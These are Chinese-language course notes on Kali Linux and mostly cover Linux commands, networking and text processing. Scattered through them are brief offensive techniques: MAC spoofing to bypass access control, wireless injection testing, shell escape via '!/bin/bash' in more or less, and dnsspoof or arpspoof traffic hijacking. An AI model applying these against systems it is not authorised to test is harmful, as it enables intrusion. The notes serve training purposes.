# 笔记（day01-day11)


小飞侠--04-Kali Linux的介绍
### *Day01
1、黑客是21世纪最重要的技能（Linux）
2、道德黑客和渗透测试
3、Linux为什么成为黑客的首选
Day02
1. Linux和Kali Linux的介绍
	http://www.ctftools.com/
		Kali（近亲：Ubuntu）
		PentestBox
		Parrot
Kali Linux is an open-source, Debian-based Linux distribution geared towards various information security tasks, such as Penetration Testing, Security Research, Computer Forensics and Reverse Engineering.
渗透测试平台，专为黑客设计，集成了大量的黑客工具
在不同的信息环境下从事多种安全任务
	Penetration Testing  -渗透测试
	Security Research   -安全的研究（测试）
	Computer Forensics  --计算机电子取证
	Reverse Engineering---逆向工程
	Security Auditing  ---安全审计
（1）历史
	前身 BackTrack Linux （BT）
    第一版 2013.3
（2）Kali Linux Features（特性）

	1）More than 600 penetration testing tools included:
	   600多个渗透测试工具
	   https://tools.kali.org/
	   https://tools.kali.org/tools-listing
	   工具的分类：
	   Information Gathering --信息搜集
	   Vulnerability Analysis --漏洞（脆弱性）分析
	   Wireless Attacks ---无线攻击
	   Web Applications ---Web 应用
	   Exploitation Tools--漏洞利用工具
	   Forensics Tools--电子取证
	   Stress Testing---压力测试
	   Sniffing & Spoofing---嗅探 & 欺骗
	   Password Attacks---密码攻击
	   Maintaining Access--维持访问
	   Reverse Engineering--逆向工程
	   Hardware Hacking--硬件破解
	   Reporting Tools--报告工具
	2）Free (as in beer) and always will be:
		永远免费
		
	3）Open source Git tree
		源代码在Git仓库中可以获取
		Git 是 Linus Torvalds 为了帮助管理 Linux内核开发而开发的一个开放源码的版本控制软件。
		https://github.com/
		
	4）FHS compliant
		与FHS（文件系统层次标准）兼容
		
	5）Wide-ranging wireless device support:
	    广泛的无线设备（网卡）的支持
	
	6）Custom kernel, patched for injection
	   内核的定制，补丁的注入
	
	7）Developed in a secure environment
		在一个安全的环境中开发
	8）GPG signed packages and repositories
	
	   软件包和软件仓库都是经过GPG签名
	9）Multi-language support:
	   支持多种语言
	   
	10）Completely customizable:
	   支持完全定制
	   
	11）ARMEL and ARMHF support
	    ARM处理器的支持
		典型的设备如 Raspberry Pi（树莓派）
	   
没有总结就没有提高	   
	   
### Day03
1.Kali Linux的安装

PS1:在Bios中开启CPU虚拟化功能
PS2：安装镜像

推荐的配置（最小）：
RAM: 2GB
Hard disk: 60GB
CPU: 2个核心
网络类型：NAT
		192.168.*.0/24
		网关：192.168.*.2
虚拟机上网（IP地址自动获取）
	服务管理工具：services.msc
		VMware DHCP Service
		VMware NAT Service
主机名：*.qwfy.org 

PS3： 建议大家去创建一个专用的实验文件夹（英文命名）

	如：01-Lab
Step01: 创建一个虚拟机


Ctrl+ALT+F2--切换到控制台（另一个终端）
Ctrl+ALT+F5--回到图形窗口
ip a 查看IP地址
ip r 查看路由
cat /etc/resolv.conf 查看DNS
ping -c 1 g.cn
  -c  指发包的个数

### Day04	   
4.1. Introductory Terms and Concepts
常用的术语和概念
（1）Binaries
	二进制文件，可执行，类似于Windows中的*.exe文件
	位置 /usr/bin---普通程序，如cat
		 /usr/sbin--管理程序，如halt（关机）
（2）Case sensitivity
		区分大小写
		
（3）Directory
		目录
（4）Home 
	每个普通用户在/home目录下都有一个自己的家目录
	~ 表示家
	cd ~ 或 cd
	 返回到家目录
	cd ~/xiaofeixia 回到当前用户家目录下的xiaofeixia目录
	cd ~xiaofeixia  回到xiaofeixia用户的家目录
（5）root
	Linux下的管理员（超级用户）
	/root ---root用户的家目录
	
	sudo su -  切换到管理员（提权）  相当于 sudo su - root
		su 切换用户身份，如果没有指定用户，默认就是root用户
		命令：su  -  用户
		- 表示切换到用户的工作环境
（6）Script
	 脚本，就是一段可执行的代码
	 许多黑客工具都是一段简单的脚本
	 scripting language interpreters, such as Python, Perl, or Ruby.
	 常用的脚本语言：shell、Python、Perl、Ruby等
	 Python 是目前黑客中最受欢迎的脚本语言
（7）Shell
    Shell 这是一个在 Linux 中运行命令的环境和解释器
	常用的Shell是Bash
	
	echo $SHELL  
	echo $变量名
	zsh是Kali 2021默认的shell
（8）Terminal-终端 This is a command line interface (CLI).
   终端就是一个命令行接口
	PS1:在Kali中打开终端
	Ctrl+ALT+T

	
教徒
	

PS2:sudo--授权管理工具
sudo -l 查看授权列表
在执行sudo命令时，默认会对当前用户身份进行验证

用户 xiaofeixia 可以在 kali2 上运行以下命令：
    (ALL : 	ALL) ALL

xiaofeixia用户可以以所用户身份在当前主机运行所有命令（具备完全管理权限）

sudo 命令，默认就是以root用户身份执行命令，相当于sudo -u root  命令
如sudo init 0 （关机）

PS3:清屏 ctrl+l

PS4: cd -
     返回到上次工作目录
	 cd ~
	 返回到家目录

### Day05
1.使用虚拟机文件部署Kali Linux

default credentials "kali/kali".

*.vmx
	虚拟机配置文件
*.vmdk
	虚拟机硬盘文件


 sudo passwd root   
 
 2. A Tour of Kali--Kali之旅
 
 2.1. passwd
 
 passwd  更改密码
	-S  查看用户密码的状态
	-l, --lock                    锁定指定的帐户
	-u, --unlock                  解锁被指定帐户


 用户密码文件 /etc/shadow
 用户账户文件 /etc/passwd 

2.2 Linux文件系统

Linux只有一个根（/）
根是整个文件系统的入口（起始位置）
从根开始描述的路径就称为绝对路径
/root root用户的家目录
/boot 引导文件和内核文件
/home 
/etc  系统的配置文件
/mnt  常用的挂载点（mount point）--文件系统
  对于（外部）设备的访问需要进行挂载才可以访问
  挂载（mount）就是把一个设备（文件系统）和一个目录关联
  
	mount 设备（文件系统） 目录
	mount /dev/cdrom /mnt
  卸载
	umount 设备  或
	umount 挂载点
/media  常用的挂载点--外部移动设备，如U盘、光盘
/dev  设备文件目录  
	如/dev/cdrom 光盘
	  /dev/sda  第一块scsi接口的硬盘
	  /dev/sda1 第一块scsi接口的硬盘第一个分区
	  /dev/sdb
/proc  虚拟文件系统，反映的是内核内部的数据信息
/sys  内核关于硬件的数据信息
/bin---普通程序
/sbin--管理程序
/lib  --库文件（相当于Windows中的dll文件）
/usr   --面向用户级
	/usr/bin
	/usr/sbin
	/usr/lib
PS1:df
	查看文件系统
	df -T -h
	-T  文件系统类型
	-h  以适合的容量单位显示
	
ls /dev/cdrom
	


### Day06
Basic Commands in Linux

?哪个目录常用于存储配置文件？/etc

6.1 创建一个自己的工作目录

mkdir -pv work/{doc,app,bak,script,exam} 

mkdir -p test/{1..100}
mkdir {a..d} 


work/
  doc---文档
  app---应用
  bak---备份
  script--脚本
  exam--练习



mkdir 创建目录
	-p, --parents     需要时创建目标目录的上层目录，但即使这些目录已存在
                      也不当作错误处理


ls -ld dir1 查看目录本身的属性
ls -l dir1  查看目录下对象属性

rm -rf dir1  删除目录


6.2. Finding Yourself with pwd

pwd 
	查看当前所处的位置
    打印当前工作目录
	
PS: 相对路径（从当前工作目录描述的路径）
	cd work/exam
	
6.3. Checking Your Login with whoami

whoami  
	查看当前用户（我是谁）
	
6.4. Navigating the Linux Filesystem

Changing Directories with cd

cd ..  返回上一级目录
cd .    还是在当前目录
cd ./work   进入到当前目录下的work目录
cd ../..    返回到上一级目录的上一级目录
cd ../../..
cd  -
cd ~  | cd
cd ~xiaofeixia
cd ~/xiaofeixia

6.5. Listing the Contents of a Directory 
列出目录内容
ls  
ls -l  长格式显示
ls -la 显示隐藏文件
ls -ld work

6.6. Getting Help
获取帮助

eg1:
aircrack-ng --help
	无线破解工具
或者
eg2
nmap -h
	著名的网络扫描工具
eg3
man （manual ）查看联机手册
	G 回到手册最后一行
	gg 回到手册第一行
	/关键字 向下根据关键字查找
	如/EXAMPLES（例子）
	q 退出


PS1
shell中常用快捷键
ctrl+w  删除光标左侧的单词
ctrl+A  回到行首
ctrl+e  回到行尾



### Day07
Finding Stuff  //查找

7.1. Searching with locate
locate
根据关键字在整个Linux文件系统中查找（定位）相关的文件
用法： locate 关键字
（1）基于自已的数据库对文件进行查找
（2）会把匹配的文件全部给出
（3）建议在使用locate之前可以使用updatedb手动更新
	数据库（/var/lib/mlocate/mlocate.db）
locate aircrack-ng
locate passwd | more

7.2. Finding Binaries with whereis
使用whereis查找可执行文件、库文件

7.3. Finding Binaries in the PATH Variable with which

使用which在PATH变量中查找可执行文件

PS1: PATH变量
（1）路径搜索变量
（2）查看变量  echo $变量名
	echo $PATH
（3）路径之间用:分隔
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
（4）作用
 当执行一个（外部）命令程序时，会在PATH变量中查找有无这个程序
 cd /root/work/exam
 pwd 
 cat /etc/resolv.conf
 which cat
 type cat
  echo $PATH
 mv /usr/bin/cat   .
 ls
 cat /etc/resolv.conf
 which cat
 ls  
 /root/work/exam/cat /etc/resolv.conf
 mv cat /usr/bin
 cat /etc/resolv.conf 


PS2:type判定命令程序是内部命令还是外部命令

7.4. Performing More Powerful Searches with find
搜索功能强大的find命令

查找的条件
	文件的类型、名称、属主、属组、大小、创建（或修改）时间、权限等
	
基本语法 
	find directory options expression
	find  路径  选项    表达式
ex01
	find / -type f  -name apache2
ex02 
   find /etc -type f  -name apache2
	
	
-type  文件的类型， f 表示普通文件，d表示目录
-name  文件的名称，可以支持通配符
Wildcards come in a few different forms: * . , ? and [].
常用的通配符有
*  任意（0个或多个）字符
？ 单个字符
[] 一个列表
ex03
  find / -type f  -name apache2*
  find /etc -type f  -name apache2?????

  apache2.conf
	



touch a1 a2 a3 a4 a5 a100
find .  -name "a?"
find .  -name "a[1,3,5]"

### Day08
8.1. 快速理解通配符

常用的通配符有
*  任意（0个或多个）字符
	which matches any character(s) of any length, from none toan unlimited number of characters.
？ 单个字符
[] 一个列表，匹配列表中的任意单个字符

find .  -name "?at"
find .  -name "[bc]at"
find .  -name "[b-c]at"
find .  -name "[b,c]at"
find .  -name "*at" 

8.2.  Filtering with grep
使用grep去做文本的过滤
在每个<文件>中查找给定<模式>。也可以对来自另一个命令的输出做过滤

用法: grep [选项]... 模式 [文件]...


（1）常与管道符（|）结合在一起使用

ps aux | grep apache2

ls /usr/bin  | grep zip

（2）常用的命令选项

1）grep --help
2） -r, --recursive
   递归
ls -R /usr | grep zip

mkdir -pv 01/001/0001 
echo xiaofeixia is very great  >01/test01.txt 
echo xiaofeixia is very great  >01/001/test001.txt
echo xiaofeixia is very great  >01/001/0001/test0001.txt
grep xiaofeixia 01
grep -r xiaofeixia 01 

3）-i  忽略大小写

 echo XIAOFEIXIA is very great  >01/001/0001/test0002.txt
 grep -r  -i xiaofeixia 01



PS1:管道符（|）
	把前一个命令的输出当作后一个命令的输入，常用于连接多个命令

PS2: 查看端口
 netstat -tunlp
	-t  tcp
	-u  udp
	-n  数字形式显示
	-l, --listening          display listening server sockets
	   显示当前正在监听的端口
	-p  哪个程序（进程）在使用该端口
PS3:Web服务程序--apache2
启动Web服务

systemctl start apache2

PS4: ps  aux   显示所有系统正在运行进程


PS5: systemctl 系统服务控制工具
systemctl [OPTIONS...] COMMAND ...


  systemctl 命令  服务名称
  
  常用的命令：
	start 启动
	stop  停止
	restart 重启
	enable 把服务设置开机启动
	disable 把服务设置为开机不启动
	is-enabled 查询服务是否设置为开机启动
	status 查询服务的状态
	
	systemctl start apache2

PS6： echo $?   
	查看命令的执行状态
	正确执行为0，否则就是错误的

PS7： SSH服务
	  常用于远程连接（安全）
	  端口号 tcp/22
	  systemctl start ssh     开启SSH服务
	  ps aux | grep sshd  
	  netstat -tunlp | grep 22
PS8: !n
     调用最近一次以n打头的指令



PS9：查看进程树 pstree

pstree | grep apache2

### Day09
文件和目录的基本操作

9.1. Creating Files 文件的创建

（1）cat 
concatenate（连接）的缩写，即combine pieces together
1）把碎片组合在一起（意味着可以使用cat创建一个小文件）
2）显示文件
	-n  显示行号

cat > 文件 
内容
……
ctrl+d  退出

PS1: 重定向
>  覆盖
>> 追加


PS2: Bash小技巧

ESC+. （或!$） 调用上一个命令的参数

扩展：在脚本中使用cat创建一个文件（非交互式）

cat > catfile << EOF
文件的内容
EOF
PS:EOF表示输入到此结束，也可以是其他字符或符号

#!/bin/bash
by xiaofeixia
Function: This is cat example
echo "This is use cat to create file example"
cat > catfile << EOF
文件的内容
EOF
ls catfile
cat -n catfile
案例2

cat > catfile2 << EOF
内容
EOF


脚本的例子：
1）创建我的第一个脚本

#!/bin/bash  第一行
	//#!告诉系统脚本将会使用哪个解释器
	//bash是常用的一种shell命令解释器，路径为/bin/bash

命令

#!/bin/bash

echo "Hello,Hacker-Arise"




2）给脚本添加可执行权限
执行位  x 

chmod +x  脚本文件

chmod  更改权限

3）执行脚本
./ex02.sh
day09/ex02.sh
/root/work/exam/day09/ex02.sh 
sh /root/work/exam/day09/ex02.sh 





（2）vi去创建一个文件
File Creation with touch

（2）File Creation with touch
使用touch 创建 文件



### Day10
10.1 File Creation with touch

使用touch 创建一个空文件

这个命令最初是为了让用户可以简单地触摸一个文件来更改它的一些细节，比如创建或修改的日期。但是，如果该文件不存在，该命令会默认创建该文件

10.2. Creating a Directory
mkdir  创建目录
	-pv

mkdir -p dir{1..10}/{ah,sd,sc}xh/dir{1..100}

10.3 复制文件--cp

  Copying a File
  
  cp  源  目标
  
  cp oldfile /root/work/exam/day10/dir1/
  cp oldfile /root/work/exam/day10/dir1/newfile
  
  cp oldfile dir2/
  cp oldfile dir2/newfile
  
  
  cp oldfile f1 dir3/ 
  //把oldfile和f1复制到dir3目录下
  最后一个是目标，且目标应该为目录
  
  cp c* dir5/ 
  
  复制一个目录 -a 选项 相当于-dR
			   -R  递归
	cp -a dir1 dir9/
                         
10. Renaming a File 文件重命名或移动

	mv
	
11. Removing a File  删除文件
   rm  
12. Removing a Directory
	删除目录
	rm -rf 目录
	    -f, --force          强制删除
		-r, -R, --recursive   递归删除目录及其内容
		-i                    每次删除前提示确认
### Day11

练习：



常用的文件类型

l---软链接（link）文件（类似于Windows中的快捷方式）
d---目录
-   普通文件

Kali中字典文件存放位置 
	/usr/share/wordlists 
	
分析和管理网络

11.1 Analyzing Networks with ifconfig
使用ifconfig查看和分析网络（状态）

eth0 -第一块有线网卡
ensXX
em0

wlan0-第一块无线网卡

ifconfig -a
  -a  查看所有的接口（包括活动的和不活动的）
ifconfig eth0 down
	停用eth0这块网卡
ifconfig eth0 up
	启用eth0这块网卡


  
11.2 Checking Wireless Network Devices with iwconfig
使用iwconfig检查无线设备


11.3. ip address show //查看IP地址
	  ip a
	  
11.4 Changing Your IP Address
更改IP地址

1）临时更改

	1）ifconfig eth0 192.168.195.66 
	//使用的是默认子网掩码
	场景：排错、调试网络
    2）ifconfig eth0 10.1.1.1 netmask 255.255.255.0  
    //使用netmask 指定子网掩码	
	
	实验
	ifconfig eth0 10.1.1.1
	ifconfig
	ifconfig eth0 10.1.1.1 netmask 255.255.255.0  
	ifconfig
Snagit


# 笔记（day012-day17)
### Day12
unicast  单播
Broadcast  广播
multicast  组播
目标MAC地址 源MAC地址  类型   Data   FCS（帧校验和）

12.1 在Kali中如何使用无线网卡连接Wifi

Step1：建议先在你的笔记本中去使用这个无线网卡连接Wifi

驱动：https://service.tp-link.com.cn/detail_download_1325.html

Step2: 在虚拟机中添加USB控制器

把它连接到虚拟机中

Step3: 查看网络接口
ifconfig -a
如果无线网卡没有up，使用ifconfig wlan0 up 启用无线网卡

Step4: 使用iwconfig收集无线网卡的信息

iwconfig

连接上wifi看到的现象
iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11  ESSID:"Xiaomi_20A8"  
          Mode:Managed  Frequency:2.437 GHz  Access Point: 88:C3:97:C2:F1:4E   
          Bit Rate=150 Mb/s   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
          Link Quality=70/70  Signal level=-36 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:16   Missed beacon:0		  
PS：iwconfig
（1）IEEE 802.11 无线网络的标准
	  802.11 a/b/g/n
	  	  802.11n 支持2.4GHZ和5GHZ
	  理论带宽最高600Mpbs
（2）ESSID就是wifi的标识
（3）Access Point（AP，无线接入点）: 无线路由器的MAC地址
（4）Mode:Managed  无线网卡的模式
		Managed--客户端模式，连接Wifi通常使用的模式
		Monitor（监视）或promiscuous（混杂） 
		在破解无线密码时，我们需要使用到混杂模式(promiscuous mode)或Monitor模式，在这种模式下，网卡处于嗅探状态（被称为Passive状态，被动状态）

Step5: 连接指定的Wifi
	通过图形化的网络管理器（推荐） 
前提：NetworkManager服务要开启（服务名称区分大小写）
	systemctl status NetworkManager

12.2. 在Kali中查看你的无线网卡是否可以用于无线攻击

1）iw list  查看无线网卡支持的模式

 Supported interface modes:
                 * IBSS
                 * managed
                 * AP（有）
                 * AP/VLAN
                 * monitor（有）
                 * mesh point
                 * P2P-client
                 * P2P-GO
                 * outside context of a BSS
2）查看是否支持数据包的注入功能

aireplay-ng -9 wlan0

 Injection（注入） is working!  ///


### Day13
13.1. Spoofing Your MAC Address
MAC地址欺骗

MAC地址（物理地址）是全球唯一的，48位，16进制表示
E4-B9-7A-5A-5A-57
00:0c:29:76:ad:98
https://mac.bmcx.com/（MAC地址查询）
ipconfig /all
ifconfig eth0

防范：通常被用作一种安全措施，以防止黑客进入网络——或追踪他们
攻击：更改MAC地址来伪装成一个不同的MAC地址使得上述安全措施无效
这是一项非常有用的绕过网络访问控制技术。

ncpa.cpl--网络连接

arp协议--把IP地址解析成MAC地址

arp -a  查看ARP缓存
arp -d  删除ARP缓存
arp -d 192.168.195.149  //删除指定的条目

更改MAC地址
方法1：ifconfig eth0 hw ether 00:0c:29:76:ad:99

方法2：

macchanger -s eth0
  -s  查看MAC地址
macchanger eth0 -m  00:0c:29:76:ad:97  
	-m  设置新的MAC地址

13.2 Assigning New IP Addresses from the DHCP Server

通过DHCP 服务器获取IP地址

DHCP协议-动态主机配置协议
Server : UDP/67
	Linux下DHCP的服务（daemon,在后台运行）进程--dhcpd
Client : UDP/68



DHCP 服务器为子网上的所有机器分配 IP 地址，并在随时维护将 IP
地址分配给哪台机器的日志文件。这使得它成为取证分析人员在攻击后追踪黑客的绝佳资源。出于这个原因，了解 DHCP 服务器的工作原理对一名黑客很有用。

Linux下dhcp客户端调试工具 dhclient

-r  释放（release）正在使用的IP地址

dhclient eth0 -r

dhclient eth0 


### Day14

14.1. 网络参数的配置

IP地址/掩码   ifconfig eth0  或  ip a
网关（默认-default 路由）ip route show （ip r）
DNS（nameserver ，名称服务器）  cat /etc/resolv.conf

192.168.X.Y

（1）手工方式
方法1：图形化的网络管理器

依赖的服务：NetworkManager

Wired     有线
Wireless  无线


192.168.195.102/24
192.168.195.2
223.6.6.6

更改之后
 把启用连网（复选框）取消再选中

方法2：修改网卡的配置文件（掌握）
Centos（/etc/sysconfig/network-scripts/ifcfg-**）

/etc/network/interfaces

Step01: 把NetworkManager服务关闭并设置为开机不启动

systemctl stop NetworkManager //关闭
systemctl disable NetworkManager //禁用
systemctl status  NetworkManager //状态

Step02: 编辑/etc/network/interfaces

PS：推荐man interfaces

auto eth0    //启动时激活网卡
iface eth0 inet static  //接口为eth0,地址指派方式为静态（static，手工方式）
					    //dhcp
        address 192.168.195.76/24  //IP地址
        gateway 192.168.195.2      //网关
Step03 重启networking服务
systemctl restart networking


14.2 DNS的修改 Changing Your DNS Server
/etc/resolv.conf
修改方法1 vi直接编辑
search qwfy.cn   //搜索域
nameserver 8.8.8.8  //DNS服务器
nameserver
nameserver
修改方法2****
echo "nameserver 223.6.6.6" >/etc/resolv.conf
修改方法3
sed -i 's/nameserver 223.6.6.6/nameserver 8.8.8.8/' /etc/resolv.conf
sed 是非交互式的文本编辑器
-i  对原始文件内容进行修改
's/old/new/'  查找替换，把old替换成new

### Day15

15.1. Manipulating the Domain Name System---维护DNS

黑客可以使用DNS从目标处收集信息

1）包含目标名称服务器（将目标名称转换成 IP 地址的服务器）的 IP地址（A记录）
2）目标邮件服务器（MX记录）
3）潜在的所有子域名和 IP 地址

（1）Examining DNS with dig

1）dig hackers-arise.com ns   
2）dig hackers-arise.com mx
	向系统默认的DNS服务器查询
3）dig hackers-arise.com mx @223.6.6.6
	向指定的DNS服务器223.6.6.6查询
4）dig qq.com any @223.6.6.6     
	向指定DNS服务器查询qq.com域中任意记录类型
5） dig +noall +answer mail.163.com any


6）dig +noall +answer -x 220.181.14.161
	-x 反向查询

（2）nslookup
nslookup qq.com -type=any 8.8.8.8
向指定DNS服务器查询qq.com域中任意记录类型


apt install dsniff


15.2. Mapping Your Own IP Addresses
      映射你的IP地址
	Linux :/etc/hosts
	Windows: C:\Windows\System32\drivers\etc\hosts
	作用：完成主机名到IP地址的映射
		  解析的优先级会比DNS要高
			1）屏蔽一些不良网站
			2）加快上网访问的速度
			3）防止DNS劫持（DNS欺骗）
	格式：
	一行代表一条记录
	IP地址   主机名1   主机名2  ……
	
	利用dnsspoof劫持用户的流量

### Day16

安装和删除软件（第四章）

add
remove
upgrade
query

16.1. Kali 系统 的更新

Step01:  查看发行版本

lsb_release -a    

Step02 查看内核版本

uname -r


Step03  软件仓库配置文件（以.list结尾）

软件存储库存储在 /etc/apt/sources.list 文件中 

还可以把一些自定义或单独的应用独立配置一个仓库文件
往往放在/etc/apt/sources.list.d/目录中，以.list结尾，如
/etc/apt/sources.list.d/docker.list

Step04  更新工具（命令）


apt-get 可以从认证软件源下载软件包及相关信息，以便安装和升级软件包，
或者用于移除软件包，类似于Centos中的yum

1.apt-get update  更新软件包的列表（索引）
  解决更新软件包列表失败：apt-get update --fix-missing
2.apt-get upgrade   更新软件包
3.apt-get dist-upgrade  将系统升级到最新版本
4.apt-get clean    //清除更新痕迹//可选


### Day17

Advanced Packaging Tool, or apt
主要的命令就是apt-get 
通过软件仓库实现对软件包的管理，可以很好地解决软件包之间的相互依赖关系

17.1. Searching for a Package（搜索软件包）

apt-cache 可以查询和显示已安装和可安装软件包的可用信息。
它专门工作在本地的数据缓存上，而这些缓存可以通过比如
apt-get 的 'update' 命令来更新
常用的命令选项
  search - 根据正则表达式搜索软件包列表
  show - 以便于阅读的格式介绍该软件包


apt-cache search 关键字

vsftpd---FTP服务软件

apt-cache search vsftpd
apt-cache search ^vsftpd

Debian的软件包格式  *.deb（管理工具是dpkg）
dpkg - package manager for Debian
			-i  安装
			-r  删除
			-l  查看
			-L 列出属于指定软件包的文件
Centos、RedHat的软件包格式 *.rpm（管理工具是rpm）

相关单词
	Depends  依赖

17.2. 安装软件

apt-get install 软件包名

apt-get install vsftpd  

17.3 删除软件包 removing Software  
apt-get remove 软件包名

apt-get purge  软件包名
	 remove - 卸载软件包
     purge - 卸载并清除软件包的配置
	 
17.4. apt-file

apt-file可以根据命令搜索软件包

Step0: apt-get install apt-file

Step1：更新缓存
	apt-file update
Step2:
apt-file search arpspoof
//搜索arpspoof命令由哪个软件包提供
PS：arpspoof ，arp欺骗的工具


  








# 笔记（daty18-day24)
### Day18
apt-get update 取回更新的软件包列表
apt-get upgrade 软件包  //升级
apt-get install 软件包  //安装
apt-get remove  软件包  //删除

案例1
tree---显示目录树
1）apt-get install tree 
2）tree -L 1 work
    -L  指定目录级别
	
案例2 
使用dpkg安装软件包
apt-get remove tree
cd work/doc
apt-get download tree
 //download - 下载指定的二进制包到当前目录
ls -lh 
dpkg -i tree_1.8.0-1+b1_amd64.deb
which tree
tree -L 1 / 

案例3 本地软件包安装  dpkg -i
					  apt-get install -f

安装一个集成的开发环境（IDE）：Visual Studio Code

https://code.visualstudio.com/download/

wget  https://az764295.vo.msecnd.net/stable/83bd43bc519d15e50c4272c6cf5c1479df196a4d/code_1.60.1-1631294805_amd64.deb

dpkg -i  code_1.60.1-1631294805_amd64.deb 
apt-get install -f ./code_1.60.1-1631294805_amd64.deb  //自动解决安装过程中的依赖关系

案例4： 安装mtr  图形化路由跟踪工具
Full screen ncurses and X11 traceroute tool

Windows--tracert
Linux--traceroute

1）apt-cache search ^mtr

2）apt-get install mtr
3）mtr www.qq.com

案例5： 升级软件包
python3的升级

python3 -V

apt-get upgrade python3

python3 -V

案例6： 通过git方式安装软件
Installing Software with git
git clone 
从指定的仓库地址把软件代码下载（克隆,clone）到本地
recon-ng--开源的情报搜集工具
git clone https://github.com/lanmaster53/recon-ng.git

作业
meld--文件差异比较工具

### Day19
19.1 文本处理
一切皆文件

snort,NIDS（网络入侵检测系统）,现在被思科（Cisco）收购
flexible Network Intrusion Detection System
https://www.snort.org/

案例：snort的配置文件的处理

Step1: 安装snort

 apt-get install snort snort-doc  
 
 dpkg -l | grep snort
Step2: 找到其配置文件 /etc/snort/snort.conf

Step3:  查看文件 Viewing Files

（1）cat  适合查看小文件

 cat /etc/snort/snort.conf
 
（2）head  查看文件的头部
 默认显示文件的前10行
 
 head /etc/snort/snort.conf
 head -20  /etc/snort/snort.conf  //显示文件的前20行
 
 （3）显示文件的尾部
 tail
默认显示文件的后10行
	  -f,          随文件增长即时输出新增数据；（用于监视一个文件的变化）
tail +20 number.txt | more  从第20行开始显示
tail -20 number.txt 显示尾部的后20行

（4）Numbering the Lines，nl
  显示文件的行号：不给空行加行号

nl /etc/snort/snort.conf ==cat -b  /etc/snort/snort.conf
wc -l /etc/snort/snort.conf  //统计文件的行数
cat -n /etc/snort/snort.conf  （空行也进行编号）

（5）Filtering Text with grep
使用grep做文本过滤
cat /etc/snort/snort.conf | grep output


（6）挑战
cat -n /etc/snort/snort.conf  | grep output

cat -n /etc/snort/snort.conf  | head -544 | tail -9

cat -n /etc/snort/snort.conf  | sed -n '538,544p'

（7）挑战2

只查看number.txt文件（共100行）内第20到第30行的内容
seq  1 100 > number.txt
方法1：
head -30 number.txt | tail -11

方法2：
tail +20 number.txt | head -11
tail -81 number.txt | head -11

方法3：sed -n '20,30p' number.txt 


### Day20
文本三剑客
grep 过滤
sed  编辑
awk  截取
20.1. Using sed to Find and Replace
sed--非交互式 流 编辑器
使用sed查找和替换
sed中的命令：
1）s ---替换
      g--全局替换
	  数字n--替换第n次出现的字符
	  针对的是一行中出现多个要替换的字符

s/old/new/  用new替换成old

cat /etc/snort/snort.conf | grep mysql | sed 's/mysql/MYSQL/'

echo "Hi, xiaofeixia, I am be xiaofeixia" | sed 's#xiaofeixia#xiaoxiao#g'

echo "Hi, xiaofeixia, I am be xiaofeixia,you not xiaofeixia" | sed 's#xiaofeixia#xiaoxiao#2'



20.2. Viewing Files with more and less
使用more和less查看文件（分屏查看）
常结合管道符使用

（1）more
回车--向下显示一行
空格--向下显示一屏
Pageup--向上翻页
Pagedown--向下翻页
q 退出
/关键字  按关键字查找（找到之后继续查找，可以使用n
!命令  调用命令执行
!/bin/bash 调用了一个shell执行，（会用这种方法进行shell逃逸）
v 进入vi模式对文件进行编辑

（2）less
Less is more
-N  打开文件时直接显示行号

光标的快速移动
gg  第一行
G   最后一行

!命令  调用命令执行（!ls /root）
!/bin/bash 调用了一个shell执行，（会用这种方法进行shell逃逸）


（3）练习

/usr/share/wordlists ---Kali中常用的（口令）字典文件的位置
/usr/share/wordlists/metasploit
metasploit---最流行的漏洞利用框架



### Day21
文本处理小挑战 --
21.1 sort--排序
sort命令将输入文件看做由多条记录组成的数据流，而记录由可变宽度的字段组成，记录之间以换行符作为定界符，sort命令与awk一样，可将记录分成多个域（字段，field）进行处理，默认的域分隔符是空格，也可以由用户自行定义

sort比较原则是从首字符向后依次比较

空字符串<数值<字母

字母是按照字母表的顺序排序，aAbB
小写字母要排在大写字母前（<a<A<b<B<...<z<Z）
如果都是同一个字母（不考虑大小写），则比较下一级（如a1<A2）
最后按升序输出。
-n 按数字大小排序  
-u  删除所有重复行
-r  逆序排列
-t  指定域分隔符
-k  指定排序的域

sort  -k3  -n  -r  -t:  /etc/passwd
sort -k3nr -t: /etc/passwd

ls -l /etc  | sort -k5 -rn | head   


ls -l /etc  | grep -E  -v  "^d|^l"
grep 
	-E  扩展正则表达式
	-v  反向匹配
	"^d|^l" 表示以d开头或（|）以l开头
	
ls -l /etc  | grep -E  -v  "^d|^l" | sort -k5 -rn | head 

在/etc/目录中找出文件大小排在前10位的文件
sort常用的一种组合
   -urn
   


21.2 uniq

从一个文本文件中去除或禁止重复行，注：相邻的行

-c   显示重复的次数


### Day22


22.1 cut

功能：文本截取工具，是一个从指定数据中抽取指定列并将其他内容抛弃的过虑器
cut程序可以方便地配合管道使用，通常把cut命令用作管道中的过滤器。
-c  按字符截取
-d  指定域分隔符
-f  指定域的字段数

每种参数格式表示范围如下：
    N     从第1个开始数的第N个字节、字符或域
    N-    从第N个开始到所在行结束的所有字符、字节或域
    N-M   从第N个开始到第M个之间(包括第M个)的所有字符、字节或域
    -M    从第1个开始到第M个之间(包括第M个)的所有字符、字节或域

echo "Hellobaby" | cut -c2
echo "Hello baby" | cut -c7 
echo "Hello baby" | cut -c7-
echo "Hello baby" | cut -c7-9
echo "Hello baby" | cut -c-7 
echo "Hello baby" | cut -c2,7

tail -1 /etc/passwd | cut -d: -f1

22.2 挑战2---Web服务器的日志进行分析
Step01: 解压
gunzip access_log.txt.gz 
Step02 重命名
 mv access_log.txt access_log 
Step03 快速了解文件结构
head access_log  
wc -l access_log  
Step04 查找请求的IP地址，进行统计分析
cat access_log | cut -d " " -f1
cat access_log | cut -d " " -f1  | sort 
cat access_log | cut -d " " -f1  | sort | uniq -c
cat access_log | awk '{print $1}'  | sort | uniq -c
cat access_log | awk '{print $1}'  | sort | uniq -c | sort -nr 
tep05 对请求频率比较高的IP地址的HTTP请求资源进行分析和统计
cat access_log | grep '208.68.234.99' | cut -d "\"" -f2 | uniq -c
1038 GET //admin HTTP/1.1
Step06  找出访问资源的信息并使用sort 排序去重查看
cat access_log | grep '208.68.234.99' | grep 'admin' | sort -u   

HTTP 401--未授权访问
HTTP 200--访问成功

### Day23
23.1 awk
